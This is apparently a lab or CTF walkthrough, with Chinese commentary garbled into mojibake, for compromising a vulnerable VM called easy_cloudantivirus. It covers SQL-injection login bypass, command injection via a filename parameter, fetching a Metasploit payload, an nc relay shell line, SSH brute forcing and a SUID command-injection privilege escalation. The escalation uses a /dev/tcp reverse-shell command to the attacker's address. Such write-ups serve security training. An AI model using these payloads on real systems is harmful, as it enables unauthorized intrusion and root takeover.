2.easy_cloudantivirus

ä¸»æœºå‘ç°

```
nmap -sn 192.168.159.1/24
```

```
â”Œâ”€â”€(rootğŸ’€kali)-[/home/soyamilk/æ¡Œé¢]
â””â”€# arp-scan -l               
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5a:99:73, IPv4: 192.168.159.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.159.1   00:50:56:c0:00:08       VMware, Inc.
192.168.159.2   00:50:56:fb:34:d2       VMware, Inc.
192.168.159.136 00:0c:29:f5:18:42       VMware, Inc.
192.168.159.254 00:50:56:ef:44:30       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.945 seconds (131.62 hosts/sec). 4 responded

```

>arping
>
>```
>for i in $(seq 1 254); do arping -c 2 192.168.159.$i; done
>```

ç«¯å£æ‰«æ

`nmap -T4 -p- 192.168.159.136`

```
â”Œâ”€â”€(rootğŸ’€kali)-[/home/soyamilk/æ¡Œé¢]
â””â”€# nmap -T4 -p- 192.168.159.136                            
^[[3~Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-04 15:33 CST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 15:33 (0:00:00 remaining)
Nmap scan report for 192.168.159.136
Host is up (0.00087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 00:0C:29:F5:18:42 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds

```

æœåŠ¡æ‰«æ

```
â”Œâ”€â”€(rootğŸ’€kali)-[/home/soyamilk/æ¡Œé¢]
â””â”€# nmap -T4 -sV 192.168.159.136
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-04 15:30 CST
Nmap scan report for 192.168.159.136
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
MAC Address: 00:0C:29:F5:18:42 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds

```

è®¿é—® web æœåŠ¡ï¼Œfuzz æµ‹è¯•ä¸€ä¸‹

![image-20240304182225837](2.easy_cloudantivirus.assets/image-20240304182225837.png)

sqlmap è·‘ä¸€ä¸‹ï¼Œ`python sqlmap.py -r test.txt --level 5 --risk 3 --random-agent`ï¼Œçœ‹åˆ°æœ‰é‡å®šå‘ï¼ŒçŒœæµ‹ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•æˆåŠŸï¼Œå°è¯•ä¸‡èƒ½å¯†ç 

![image-20240304183252812](2.easy_cloudantivirus.assets/image-20240304183252812.png)



![image-20240304183151404](2.easy_cloudantivirus.assets/image-20240304183151404.png)

æˆ–è€…åœ¨æŠ¥é”™çš„è¿™ä¸ªä½ç½®å¯ä»¥çœ‹åˆ°æœåŠ¡çš„éƒ¨åˆ†æºç ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸‡èƒ½å¯†ç 

![image-20240304184629878](2.easy_cloudantivirus.assets/image-20240304184629878.png)

æµ‹è¯•æœ‰ç›®å½•ç©¿è¶Šçš„æ‰«æåŠŸèƒ½

![image-20240304184441291](2.easy_cloudantivirus.assets/image-20240304184441291.png)

çŒœæµ‹æ‰«æåŠŸèƒ½çš„æ„æˆæ˜¯ç”±æŸä¸ªæ‰«æè„šæœ¬æ‹¼æ¥è·¯å¾„æ„æˆï¼Œå³ä¸Šè¿°å¯è¡¨ç¤ºä¸º `scan ../../../../../etc/passwd`ï¼Œå°è¯•é€šè¿‡å‘½ä»¤åˆ†éš”ç¬¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç»æµ‹è¯•ï¼Œä½¿å‰é¢çš„ `scan` æ‰§è¡Œå¤±è´¥ç”¨ `||` æˆ–ç›´æ¥ç”¨ `;` å³å¯è¿›è¡Œå‘½ä»¤åˆ†å‰²æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚ï¼ˆæ³¨ï¼šä½¿ç”¨ `&` è¿›è¡Œåˆ†å‰²æ—¶ï¼Œ`&` éœ€è¦è¿›è¡Œ url ç¼–ç ï¼‰

åœ¨ kali ä¸Šå¼€ä¸€ä¸ªæœåŠ¡å™¨ `python3 -m http.server 60312`ï¼Œåœ¨é¶æœºä¸Šç”¨ wget ä¸‹è½½ msf çš„é©¬ï¼Œå¹¶èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œmsf å¼€å¯ç›‘å¬ï¼Œè¿è¡Œ

![image-20240305165841347](2.easy_cloudantivirus.assets/image-20240305165841347.png)

![image-20240305165947035](2.easy_cloudantivirus.assets/image-20240305165947035.png)

`filename=../../../../../etc/passwd ; chmod %2bx ./shell.elf 2>%261` åŠ æƒé™

![image-20240305170210745](2.easy_cloudantivirus.assets/image-20240305170210745.png)

![image-20240305170221045](2.easy_cloudantivirus.assets/image-20240305170221045.png)

>nc ä¸²è”
>
>`hello| nc 10.0.2.7 3333 | /bin/bash | nc 10.0.2.7 4444`
>
>é€šè¿‡ç®¡é“ç¬¦ï¼Œåœ¨ 3333 ç«¯å£è¾“å…¥å‘½ä»¤ï¼Œå‘½ä»¤ä¼šä¼ å…¥ bashï¼Œç„¶åç»“æœä¼šè¿”å›åˆ° 4444ï¼Œå¼€ä¸¤ä¸ª ncå³å¯

ä¸‹è½½æ•°æ®åº“æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç”¨sqlite3æ‰“å¼€æ•°æ®åº“æ–‡ä»¶å¹¶æŸ¥çœ‹
![image-20240305200757294](2.easy_cloudantivirus.assets/image-20240305200757294.png)

![image-20240305200834801](2.easy_cloudantivirus.assets/image-20240305200834801.png)

æŸ¥çœ‹å¯ä»¥ç™»å½•çš„ç”¨æˆ·

![image-20240306130744396](2.easy_cloudantivirus.assets/image-20240306130744396.png)

å°†ç”¨æˆ·å’Œå¯†ç ç»„æˆçˆ†ç ´å¯†ç æœ¬ï¼Œè¿›è¡Œ22ç«¯å£sshçˆ†ç ´

![image-20240306131121585](2.easy_cloudantivirus.assets/image-20240306131121585.png)

å¤±è´¥ï¼ŒæŸ¥çœ‹ä¸Šçº§ç›®å½•ï¼Œæ³¨æ„è¿™ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä»–çš„cæºç ï¼Œå¹¶ä¸”è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰suidæƒé™å¹¶ä¸”ä¸ºrootå±ä¸»

![image-20240306131855151](2.easy_cloudantivirus.assets/image-20240306131855151.png)

![image-20240306132234694](2.easy_cloudantivirus.assets/image-20240306132234694.png)

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;

}

```

å®¡è®¡æºç å¯å¾—çŸ¥ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤çš„æ‹¼æ¥ï¼Œæœ€åçš„å‘½ä»¤ä¸º

```
./update_cloudav ";/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.159.128/5555 0>&1'"
```

![image-20240306133537760](2.easy_cloudantivirus.assets/image-20240306133537760.png)

æˆåŠŸè·å¾—rootæƒé™
